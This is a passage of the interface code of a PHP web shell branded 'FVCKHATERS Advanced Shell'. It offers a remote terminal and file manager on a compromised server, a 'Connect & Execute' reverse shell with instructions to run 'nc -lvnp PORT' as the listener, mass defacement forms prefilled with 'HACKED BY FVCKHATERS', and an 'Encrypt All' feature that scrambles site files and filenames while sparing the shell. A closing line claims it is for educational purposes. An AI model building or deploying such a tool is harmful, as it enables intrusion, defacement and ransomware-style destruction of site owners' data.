            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(255,68,68,0.3);
        }
        
        .reverse-shell-card .btn-execute:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .reverse-shell-output {
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 8px;
            padding: 14px;
            margin-top: 14px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #66ff88;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .reverse-shell-output .highlight {
            color: #ff8844;
        }
        
        .reverse-shell-output .error {
            color: #ff4444;
        }
        
        .reverse-shell-output .success {
            color: #44ff88;
        }
        
        .reverse-shell-output .info {
            color: #44ccff;
        }
        
        /* DEFACE & ENCRYPT TOOLS */
        .tools-grid-2col {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 16px;
        }
        
        @media (max-width: 1024px) {
            .tools-grid-2col { grid-template-columns: 1fr; }
        }
        
        .deface-card {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 12px;
            padding: 18px 20px;
        }
        
        .deface-card .card-title {
            font-size: 11px;
            font-weight: 700;
            color: #ff6666;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .deface-card .card-title i {
            color: #ff4444;
            font-size: 14px;
        }
        
        .deface-card textarea {
            width: 100%;
            padding: 10px;
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 8px;
            color: #e8d0d0;
            font-size: 12px;
            outline: none;
            resize: vertical;
            min-height: 80px;
            font-family: 'Courier New', monospace;
            margin-bottom: 8px;
        }
        
        .deface-card textarea:focus {
            border-color: #ff4444;
        }
        
        .deface-card input[type="file"] {
            width: 100%;
            padding: 10px;
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 8px;
            color: #aa8888;
            font-size: 12px;
            margin-bottom: 8px;
            cursor: pointer;
        }
        
        .deface-card input[type="file"]::-webkit-file-upload-button {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 6px 16px;
            border-radius: 4px;
            font-weight: 700;
            font-size: 11px;
            cursor: pointer;
            margin-right: 10px;
            transition: 0.2s;
        }
        
        .deface-card input[type="file"]::-webkit-file-upload-button:hover {
            background: #cc3333;
        }
        
        .deface-card input[type="file"]::-moz-file-upload-button {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 6px 16px;
            border-radius: 4px;
            font-weight: 700;
            font-size: 11px;
            cursor: pointer;
            margin-right: 10px;
            transition: 0.2s;
        }
        
        .deface-card input[type="file"]::-moz-file-upload-button:hover {
            background: #cc3333;
        }
        
        .deface-card .btn-group {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 4px;
        }
        
        .deface-card .btn {
            padding: 8px 18px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            border: none;
        }
        
        .deface-card .btn-danger {
            background: #ff4444;
            color: #0a0505;
        }
        
        .deface-card .btn-danger:hover {
            background: #cc3333;
            transform: translateY(-1px);
        }
        
        .deface-card .btn-warning {
            background: #ff8844;
            color: #0a0505;
        }
        
        .deface-card .btn-warning:hover {
            background: #cc6633;
            transform: translateY(-1px);
        }
        
        .deface-card .btn-encrypt {
            background: #ff4444;
            color: #0a0505;
        }
        
        .deface-card .btn-encrypt:hover {
            background: #cc3333;
            transform: translateY(-1px);
        }
        
        .deface-card select {
            width: 100%;
            padding: 8px 10px;
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 6px;
            color: #e8d0d0;
            font-size: 12px;
            outline: none;
            margin-bottom: 8px;
            font-family: 'Inter', sans-serif;
        }
        
        .deface-card select:focus {
            border-color: #ff4444;
        }
        
        .deface-card .label-helper {
            color: #553333;
            font-size: 10px;
            margin-bottom: 4px;
            display: block;
        }
        
        .deface-card .label-helper i {
            color: #ff4444;
            margin-right: 4px;
        }
        
        /* Encrypt Card Special */
        .encrypt-card {
            background: #0f0808;
            border: 2px solid #ff4444;
            border-radius: 12px;
            padding: 20px;
            max-width: 600px;
        }
        
        .encrypt-card .card-title {
            font-size: 13px;
            font-weight: 700;
            color: #ff4444;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .encrypt-card .card-title i {
            color: #ff4444;
            font-size: 18px;
        }
        
        .encrypt-card .warning-box {
            background: #1a0a0a;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #2a1515;
            margin: 10px 0;
        }
        
        .encrypt-card .warning-box p {
            color: #aa8888;
            font-size: 13px;
            margin-bottom: 10px;
        }
        
        .encrypt-card .warning-box p i {
            color: #ff8844;
            margin-right: 8px;
        }
        
        .encrypt-card .warning-box ul {
            list-style: none;
            padding-left: 0;
        }
        
        .encrypt-card .warning-box ul li {
            padding: 6px 0;
            color: #883333;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .encrypt-card .warning-box ul li i {
            color: #44ff88;
            width: 16px;
        }
        
        .encrypt-card .warning-box ul li .highlight {
            color: #ff4444;
            font-weight: 600;
        }
        
        .encrypt-card .btn-encrypt-main {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 12px 28px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            width: 100%;
            justify-content: center;
            margin-top: 10px;
        }
        
        .encrypt-card .btn-encrypt-main:hover {
            background: #cc3333;
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(255,68,68,0.3);
        }
        
        .encrypt-card .btn-encrypt-main i {
            font-size: 16px;
        }
        
        /* TERMINAL */
        .terminal-box {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .terminal-box .term-header {
            background: #0a0505;
            padding: 8px 16px;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #2a1515;
            font-size: 11px;
            color: #883333;
        }
        
        .terminal-box .term-header i {
            color: #ff6666;
            margin-right: 6px;
        }
        
        .terminal-box .term-body {
            padding: 14px 16px;
            min-height: 350px;
            max-height: 450px;
            overflow-y: auto;
        }
        
        .terminal-box .term-body .output {
            color: #ff8888;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.6;
        }
        
        .terminal-box .term-input {
            display: flex;
            gap: 10px;
            padding: 10px 16px;
            border-top: 1px solid #2a1515;
        }
        
        .terminal-box .term-input input {
            flex: 1;
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 6px;
            color: #ff8888;
            padding: 8px 12px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            outline: none;
        }
        
        .terminal-box .term-input input:focus {
            border-color: #ff4444;
        }
        
        .terminal-box .term-input button {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 8px 20px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .terminal-box .term-input button:hover {
            background: #cc3333;
        }
        
        /* FILE MANAGER */
        .tools-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 12px;
            margin-bottom: 16px;
        }
        
        @media (max-width: 1024px) {
            .tools-grid { grid-template-columns: 1fr 1fr; }
        }
        @media (max-width: 640px) {
            .tools-grid { grid-template-columns: 1fr; }
        }
        
        .tool-card {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 10px;
            padding: 14px 16px;
        }
        
        .tool-card .tool-title {
            font-size: 10px;
            font-weight: 700;
            color: #883333;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 10px;
        }
        
        .tool-card .tool-title i {
            margin-right: 6px;
            color: #ff6666;
        }
        
        .tool-card input,
        .tool-card textarea {
            width: 100%;
            padding: 8px 10px;
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 6px;
            color: #e8d0d0;
            font-size: 12px;
            outline: none;
            margin-bottom: 6px;
            font-family: 'Inter', sans-serif;
        }
        
        .tool-card input:focus,
        .tool-card textarea:focus {
            border-color: #ff4444;
        }
        
        .tool-card textarea {
            height: 60px;
            resize: vertical;
            font-family: 'Courier New', monospace;
            font-size: 11px;
        }
        
        .tool-card .btn {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 8px 16px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .tool-card .btn:hover {
            background: #cc3333;
        }
        
        .tool-card .btn-secondary {
            background: #1a0a0a;
            border: 1px solid #2a1515;
            color: #aa8888;
            padding: 8px 16px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .tool-card .btn-secondary:hover {
            background: #2a1515;
            color: #ff6666;
        }
        
        .upload-area {
            border: 2px dashed #2a1515;
            border-radius: 10px;
            padding: 24px;
            text-align: center;
            color: #883333;
            transition: 0.3s;
            cursor: pointer;
            margin-bottom: 16px;
            background: #0f0808;
        }
        
        .upload-area:hover {
            border-color: #ff4444;
            color: #ff6666;
            background: #1a0a0a;
        }
        
        .upload-area i {
            font-size: 28px;
            display: block;
            margin-bottom: 8px;
            color: #663333;
        }
        
        .upload-area:hover i {
            color: #ff4444;
        }
        
        .upload-area small {
            display: block;
            font-size: 10px;
            color: #553333;
            margin-top: 3px;
        }
        
        .file-table-wrap {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        
        .file-table thead {
            background: #0a0505;
        }
        
        .file-table th {
            text-align: left;
            padding: 9px 14px;
            font-size: 9px;
            font-weight: 700;
            color: #663333;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            border-bottom: 1px solid #2a1515;
        }
        
        .file-table td {
            padding: 7px 14px;
            border-bottom: 1px solid #150a0a;
            vertical-align: middle;
        }
        
        .file-table tr:hover td {
            background: #150a0a;
        }
        
        .file-table .folder-item {
            color: #ff8844;
            text-decoration: none;
            font-weight: 500;
        }
        
        .file-table .folder-item i {
            margin-right: 8px;
        }
        
        .file-table .file-item {
            color: #88ccff;
        }
        
        .file-table .file-item i {
            margin-right: 8px;
            width: 16px;
            color: #663333;
        }
        
        .file-table .actions {
            display: flex;
            gap: 4px;
        }
        
        .file-table .actions a {
            color: #663333;
            text-decoration: none;
            padding: 3px 6px;
            border-radius: 4px;
            transition: 0.15s;
            font-size: 12px;
            cursor: pointer;
        }
        
        .file-table .actions a:hover {
            background: #1a0a0a;
            color: #ff6666;
        }
        
        .file-table .actions a.del:hover {
            background: #2a0a0a;
            color: #ff4444;
        }
        
        .file-table .actions a.rename-link:hover {
            background: #1a0a0a;
            color: #ff8844;
        }
        
        .file-table .actions a.edit-link:hover {
            background: #0a1a1a;
            color: #44ccff;
        }
        
        .file-table .actions a.view-link:hover {
            background: #1a1a0a;
            color: #44ff88;
        }
        
        .file-table .actions a.download-link {
            color: #663333;
            text-decoration: none;
            padding: 3px 6px;
            border-radius: 4px;
            transition: 0.15s;
            font-size: 12px;
            cursor: pointer;
        }
        
        .file-table .actions a.download-link:hover {
            background: #1a0a0a;
            color: #88ffaa;
        }
        
        .file-table .perms {
            font-family: 'Courier New', monospace;
            font-size: 10px;
            color: #553333;
        }
        
        .bulk-delete-btn {
            background: #2a0a0a;
            border: 1px solid #3a1515;
            color: #ff6666;
            padding: 6px 14px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .bulk-delete-btn:hover {
            background: #3a0a0a;
            color: #ff4444;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 10px;
        }
        
        .info-card {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 10px;
            padding: 12px 16px;
        }
        
        .info-card .label {
            font-size: 9px;
            font-weight: 700;
            color: #663333;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        
        .info-card .value {
            font-size: 13px;
            font-weight: 500;
            margin-top: 3px;
            color: #ff6666;
        }
        
        .info-card .value.host {
            color: #ff8844;
        }
        
        .info-card .value .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 700;
        }
        
        .info-card .value .badge.enabled {
            background: #44ff8822;
            color: #66ff88;
        }
        
        .info-card .value .badge.disabled {
            background: #ff444422;
            color: #ff6666;
        }
        
        .search-results {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 10px;
            padding: 12px 16px;
            margin-top: 12px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .search-results .result-item {
            padding: 4px 0;
            border-bottom: 1px solid #150a0a;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            color: #88ccff;
        }
        
        .search-results .result-item .line-num {
            color: #663333;
            margin-right: 12px;
        }
        
        .search-results .result-item .highlight {
            background: #ff444422;
            color: #ff6666;
            padding: 1px 4px;
            border-radius: 2px;
        }
        
        .editor-box {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .editor-box .editor-header {
            background: #0a0505;
            padding: 8px 16px;
            border-bottom: 1px solid #2a1515;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #883333;
        }
        
        .editor-box .editor-header i {
            color: #ff6666;
        }
        
        .editor-box textarea {
            width: 100%;
            min-height: 400px;
            max-height: 600px;
            background: #0a0505;
            border: none;
            color: #e8d0d0;
            padding: 16px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.8;
            outline: none;
            resize: vertical;
        }
        
        .editor-box .editor-footer {
            padding: 10px 16px;
            border-top: 1px solid #2a1515;
            display: flex;
            gap: 10px;
        }
        
        .editor-box .editor-footer .btn-save {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 8px 20px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            text-decoration: none;
        }
        
        .editor-box .editor-footer .btn-save:hover {
            background: #cc3333;
        }
        
        .editor-box .editor-footer .btn-cancel {
            background: #1a0a0a;
            border: 1px solid #2a1515;
            color: #aa8888;
            padding: 8px 20px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            text-decoration: none;
        }
        
        .editor-box .editor-footer .btn-cancel:hover {
            background: #2a1515;
            color: #ff6666;
        }
        
        /* ABOUT PAGE */
        .about-card {
            background: #0f0808;
            border: 1px solid #2a1515;
            border-radius: 12px;
            padding: 30px;
            max-width: 600px;
            text-align: center;
        }
        
        .about-card .about-logo {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 4px solid #ff4444;
            object-fit: cover;
            margin-bottom: 20px;
        }
        
        .about-card h2 {
            color: #ff4444;
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 8px;
        }
        
        .about-card .subtitle {
            color: #883333;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .about-card .description {
            color: #aa8888;
            font-size: 13px;
            line-height: 1.8;
            margin-bottom: 20px;
        }
        
        .about-card .info-grid-about {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            text-align: left;
        }
        
        .about-card .info-grid-about .item {
            background: #0a0505;
            padding: 10px 14px;
            border-radius: 6px;
            border: 1px solid #2a1515;
        }
        
        .about-card .info-grid-about .item .label {
            color: #663333;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        
        .about-card .info-grid-about .item .value {
            color: #ff6666;
            font-size: 13px;
            font-weight: 600;
            margin-top: 2px;
        }
        
        .about-card .social-links {
            margin-top: 20px;
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        
        .about-card .social-links a {
            color: #663333;
            font-size: 20px;
            transition: 0.2s;
            text-decoration: none;
        }
        
        .about-card .social-links a:hover {
            color: #ff4444;
            transform: translateY(-2px);
        }
        
        @media (max-width: 768px) {
            .sidebar { width: 56px; }
            .sidebar-header .logo h1 { display: none; }
            .sidebar-header .logo small { display: none; }
            .sidebar-header { padding: 12px; }
            .sidebar-header .logo-img { width: 36px; height: 36px; }
            .nav-item { padding: 10px 12px; justify-content: center; }
            .nav-item span { display: none; }
            .nav-item i { margin: 0; font-size: 16px; }
            .nav-section-title { display: none; }
            .sidebar-footer { display: none; }
            .content { padding: 12px; }
            .topbar { padding: 8px 12px; flex-wrap: wrap; gap: 4px; }
            .topbar .path { font-size: 10px; }
            .info-grid { grid-template-columns: 1fr; }
            .tools-grid-2col { grid-template-columns: 1fr; }
            .about-card .info-grid-about { grid-template-columns: 1fr; }
            .reverse-shell-card { padding: 16px; }
        }
    </style>
</head>
<body>
    <!-- SIDEBAR -->
    <div class="sidebar">
        <div class="sidebar-header">
            <div class="logo">
                <img src="https://gurugokil.my.id/uploads/1783791356_74e443b2.jpg" alt="FVCKHATERS" class="logo-img" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
                <i class="fas fa-skull" style="font-size:36px;color:#ff4444;display:none;"></i>
                <h1>FVCKHATERS <small>ADVANCED SHELL</small></h1>
            </div>
        </div>
        
        <nav class="sidebar-nav">
            <div class="nav-section">
                <div class="nav-section-title">MAIN</div>
                <a class="nav-item <?= $view === 'terminal' ? 'active' : '' ?>" onclick="switchView('terminal')">
                    <i class="fas fa-terminal"></i>
                    <span>Terminal</span>
                </a>
                <a class="nav-item <?= $view === 'files' ? 'active' : '' ?>" onclick="switchView('files')">
                    <i class="fas fa-folder"></i>
                    <span>File Manager</span>
                </a>
            </div>
            <div class="nav-section">
                <div class="nav-section-title">TOOLS</div>
                <a class="nav-item" onclick="document.getElementById('uploadTrigger').click();">
                    <i class="fas fa-cloud-upload-alt"></i>
                    <span>Upload</span>
                </a>
                <a class="nav-item <?= $view === 'create' ? 'active' : '' ?>" onclick="switchView('create')">
                    <i class="fas fa-file-plus"></i>
                    <span>Create File</span>
                </a>
                <a class="nav-item <?= $view === 'reverse' ? 'active' : '' ?>" onclick="switchView('reverse')">
                    <i class="fas fa-network-wired"></i>
                    <span>Reverse Shell</span>
                </a>
            </div>
            <div class="nav-section">
                <div class="nav-section-title">DEFACE</div>
                <a class="nav-item <?= $view === 'deface' ? 'active' : '' ?>" onclick="switchView('deface')">
                    <i class="fas fa-skull-crossbones"></i>
                    <span>Mass Deface</span>
                </a>
                <a class="nav-item <?= $view === 'encrypt' ? 'active' : '' ?>" onclick="switchView('encrypt')">
                    <i class="fas fa-lock"></i>
                    <span>Encrypt All</span>
                </a>
            </div>
            <div class="nav-section">
                <div class="nav-section-title">SYSTEM</div>
                <a class="nav-item <?= $view === 'info' ? 'active' : '' ?>" onclick="switchView('info')">
                    <i class="fas fa-server"></i>
                    <span>Server Info</span>
                </a>
                <a class="nav-item <?= $view === 'about' ? 'active' : '' ?>" onclick="switchView('about')">
                    <i class="fas fa-info-circle"></i>
                    <span>About Us</span>
                </a>
                <a class="nav-item logout-item" href="?logout=1" onclick="return confirm('Are you sure you want to logout?')">
                    <i class="fas fa-sign-out-alt"></i>
                    <span>Logout</span>
                </a>
            </div>
        </nav>
        
        <div class="sidebar-footer">
            <div class="info-row">
                <span class="info-label">Current User</span>
                <span class="info-value"><?= htmlspecialchars($serverInfo['Current User']) ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Hostname</span>
                <span class="info-value host"><?= htmlspecialchars($serverInfo['Server Hostname']) ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Free Space</span>
                <span class="info-value"><?= $serverInfo['Disk Free Space'] ?> / <?= $serverInfo['Disk Total Space'] ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">PHP Version</span>
                <span class="info-value"><?= $serverInfo['PHP Version'] ?></span>
            </div>
            <div class="creator-credit">
                Made with <i class="fas fa-heart" style="color:#ff4444;"></i> by <strong>FVCKHATERS</strong>
            </div>
        </div>
    </div>

    <!-- MAIN -->
    <div class="main">
        <div class="topbar">
            <div class="path">
                <i class="fas fa-folder-open"></i>
                <span><?= htmlspecialchars($currentDir) ?></span>
            </div>
            <div class="user-badge">
                <i class="fas fa-user"></i>
                <?= htmlspecialchars($serverInfo['Current User']) ?>@<?= htmlspecialchars($serverInfo['Server Hostname']) ?>
            </div>
        </div>

        <div class="content">
            <?php if ($message): ?>
                <div class="alert <?= $messageType ?>">
                    <i class="fas <?= $messageType === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle' ?>"></i>
                    <?= $message ?>
                </div>
            <?php endif; ?>

            <!-- Hidden Upload -->
            <form method="POST" enctype="multipart/form-data" id="uploadForm" style="display:none;">
                <input type="file" name="uploaded_file" id="uploadTrigger" onchange="document.getElementById('uploadForm').submit();">
                <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
            </form>

            <?php if ($view === 'reverse'): ?>
                <!-- REVERSE SHELL AUTO EXECUTE -->
                <h3 style="color:#883333;font-size:13px;font-weight:600;margin-bottom:16px;">
                    <i class="fas fa-network-wired" style="color:#ff4444;margin-right:8px;"></i>
                    Reverse Shell - Auto Execute
                </h3>
                
                <div class="reverse-shell-card">
                    <div class="card-title">
                        <i class="fas fa-terminal"></i>
                        PHP Reverse Shell
                    </div>
                    
                    <?php if ($reverseShellError): ?>
                        <div class="reverse-shell-output" style="color:#ff4444;">
                            <span class="error">[!] <?= htmlspecialchars($reverseShellError) ?></span>
                        </div>
                    <?php endif; ?>
                    
                    <?php if ($reverseShellOutput): ?>
                        <div class="reverse-shell-output">
                            <?= htmlspecialchars($reverseShellOutput) ?>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <div class="form-group">
                            <label><i class="fas fa-ip"></i> IP Address</label>
                            <input type="text" name="reverse_ip" placeholder="e.g., 192.168.1.100" value="<?= htmlspecialchars($_POST['reverse_ip'] ?? '127.0.0.1') ?>" required>
                            <div class="input-hint">Your listener IP address</div>
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-plug"></i> Port</label>
                            <input type="number" name="reverse_port" placeholder="e.g., 4444" value="<?= htmlspecialchars($_POST['reverse_port'] ?? '1234') ?>" required min="1" max="65535">
                            <div class="input-hint">Port to listen on (1-65535)</div>
                        </div>
                        <button type="submit" name="execute_reverse_shell" class="btn-execute" id="executeBtn">
                            <i class="fas fa-play"></i> Connect & Execute
                        </button>
                        <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                    </form>
                    
                    <div style="margin-top:16px;padding:12px;background:#0a0505;border-radius:8px;border:1px solid #2a1515;font-size:11px;color:#553333;">
                        <i class="fas fa-info-circle" style="color:#ff8844;"></i>
                        <strong style="color:#aa8888;">How to use:</strong><br>
                        1. Start listener on your machine: <span style="color:#66ff88;">nc -lvnp PORT</span><br>
                        2. Enter your IP and Port above<br>
                        3. Click <span style="color:#ff4444;">Connect & Execute</span><br>
                        4. You will get a reverse shell connection!
                    </div>
                </div>

            <?php elseif ($view === 'about'): ?>
                <!-- ABOUT US -->
                <div class="about-card">
                    <img src="https://gurugokil.my.id/uploads/1783791356_74e443b2.jpg" alt="FVCKHATERS" class="about-logo" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
                    <i class="fas fa-skull" style="font-size:64px;color:#ff4444;display:none;margin-bottom:20px;"></i>
                    <h2>FVCKHATERS</h2>
                    <div class="subtitle">Advanced Shell</div>
                    <div class="description">
                        Advanced web shell with complete features for file management, 
                        terminal access, mass deface, encryption tools, and reverse shell generation.
                        Built for educational and testing purposes.
                    </div>
                    <div class="info-grid-about">
                        <div class="item">
                            <div class="label">Creator</div>
                            <div class="value">FVCKHATERS</div>
                        </div>
                        <div class="item">
                            <div class="label">Version</div>
                            <div class="value">14.0</div>
                        </div>
                        <div class="item">
                            <div class="label">PHP Version</div>
                            <div class="value"><?= phpversion() ?></div>
                        </div>
                        <div class="item">
                            <div class="label">Server</div>
                            <div class="value"><?= htmlspecialchars($serverInfo['Server Software']) ?></div>
                        </div>
                        <div class="item">
                            <div class="label">OS</div>
                            <div class="value"><?= htmlspecialchars($serverInfo['Server OS']) ?></div>
                        </div>
                        <div class="item">
                            <div class="label">Hostname</div>
                            <div class="value host"><?= htmlspecialchars($serverInfo['Server Hostname']) ?></div>
                        </div>
                    </div>
                    <div class="social-links">
                        <a href="#" title="GitHub"><i class="fab fa-github"></i></a>
                        <a href="#" title="Telegram"><i class="fab fa-telegram"></i></a>
                        <a href="#" title="Twitter"><i class="fab fa-twitter"></i></a>
                        <a href="#" title="Instagram"><i class="fab fa-instagram"></i></a>
                    </div>
                </div>

            <?php elseif ($view === 'deface'): ?>
                <!-- MASS DEFACE TOOLS -->
                <h3 style="color:#883333;font-size:13px;font-weight:600;margin-bottom:16px;">
                    <i class="fas fa-skull-crossbones" style="color:#ff4444;margin-right:8px;"></i>
                    Mass Deface Tools
                </h3>
                
                <div class="tools-grid-2col">
                    <!-- Mass Deface PHP -->
                    <div class="deface-card">
                        <div class="card-title"><i class="fab fa-php"></i>Mass Deface PHP</div>
                        <form method="POST" enctype="multipart/form-data">
                            <span class="label-helper"><i class="fas fa-code"></i>Deface content (or upload file below)</span>
                            <textarea name="deface_content_php" placeholder="Enter PHP deface code...">&lt;?php echo "HACKED!"; ?&gt;</textarea>
                            <input type="file" name="deface_upload_php" accept=".php,.txt">
                            <div class="btn-group">
                                <button type="submit" name="mass_deface_php" class="btn btn-danger">
                                    <i class="fas fa-skull"></i> Deface All PHP
                                </button>
                            </div>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>

                    <!-- Mass Deface HTML -->
                    <div class="deface-card">
                        <div class="card-title"><i class="fab fa-html5"></i>Mass Deface HTML</div>
                        <form method="POST" enctype="multipart/form-data">
                            <span class="label-helper"><i class="fas fa-code"></i>Deface content (or upload file below)</span>
                            <textarea name="deface_content_html" placeholder="Enter HTML deface code...">&lt;h1&gt;HACKED BY FVCKHATERS&lt;/h1&gt;</textarea>
                            <input type="file" name="deface_upload_html" accept=".html,.htm,.txt">
                            <div class="btn-group">
                                <button type="submit" name="mass_deface_html" class="btn btn-danger">
                                    <i class="fas fa-skull"></i> Deface All HTML
                                </button>
                            </div>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>
                </div>

                <div class="tools-grid-2col">
                    <!-- Mass Deface TXT -->
                    <div class="deface-card">
                        <div class="card-title"><i class="fas fa-file-alt"></i>Mass Deface TXT</div>
                        <form method="POST">
                            <span class="label-helper"><i class="fas fa-target"></i>Target files</span>
                            <select name="txt_file_type">
                                <option value="index">Only index.php & index.html</option>
                                <option value="all">All PHP & HTML files</option>
                            </select>
                            <span class="label-helper"><i class="fas fa-pen"></i>Text content</span>
                            <textarea name="txt_content" placeholder="Enter text content...">touch by fvckhaters</textarea>
                            <div class="btn-group">
                                <button type="submit" name="mass_deface_txt" class="btn btn-danger">
                                    <i class="fas fa-file-alt"></i> Convert to .txt
                                </button>
                            </div>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>

                    <!-- Encrypt All -->
                    <div class="deface-card" style="border-color:#ff4444;">
                        <div class="card-title" style="color:#ff4444;"><i class="fas fa-lock"></i>Encrypt All Files</div>
                        <form method="POST">
                            <span class="label-helper" style="color:#ff4444;">
                                <i class="fas fa-info-circle"></i> 
                                Will encrypt all files/folders except shell.php, index.php, index.html
                            </span>
                            <div style="background:#0a0505;padding:10px;border-radius:6px;margin:8px 0;font-size:11px;color:#883333;border:1px solid #2a1515;">
                                <div style="padding:3px 0;"><i class="fas fa-arrow-right" style="color:#ff4444;"></i> Multi-layer encryption: Base64 → MD5 → Multi-language → SHA256 → XOR</div>
                                <div style="padding:3px 0;"><i class="fas fa-arrow-right" style="color:#ff4444;"></i> Filenames will be automatically encrypted & randomized</div>
                            </div>
                            <div class="btn-group">
                                <button type="submit" name="encrypt_all" class="btn btn-danger" onclick="return confirm('WARNING: This will encrypt all files in this directory. Continue?')">
                                    <i class="fas fa-lock"></i> Encrypt All
                                </button>
                            </div>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>
                </div>

            <?php elseif ($view === 'encrypt'): ?>
                <!-- ENCRYPT ALL PAGE -->
                <h3 style="color:#883333;font-size:13px;font-weight:600;margin-bottom:16px;">
                    <i class="fas fa-lock" style="color:#ff4444;margin-right:8px;"></i>
                    Encrypt All Files
                </h3>
                
                <div class="encrypt-card">
                    <div class="card-title">
                        <i class="fas fa-lock"></i>
                        Encrypt Directory
                    </div>
                    <form method="POST">
                        <div class="warning-box">
                            <p>
                                <i class="fas fa-exclamation-triangle"></i>
                                <strong style="color:#ff6666;">WARNING:</strong> This will permanently encrypt all files!
                            </p>
                            <ul>
                                <li><i class="fas fa-check"></i> All files will be encrypted with multi-layer encryption</li>
                                <li><i class="fas fa-check"></i> Filenames will be randomized</li>
                                <li><i class="fas fa-check"></i> <span class="highlight">shell.php, index.php, index.html</span> are <strong style="color:#ff4444;">EXCLUDED</strong></li>
                                <li><i class="fas fa-check"></i> Encryption log will be saved</li>
                            </ul>
                        </div>
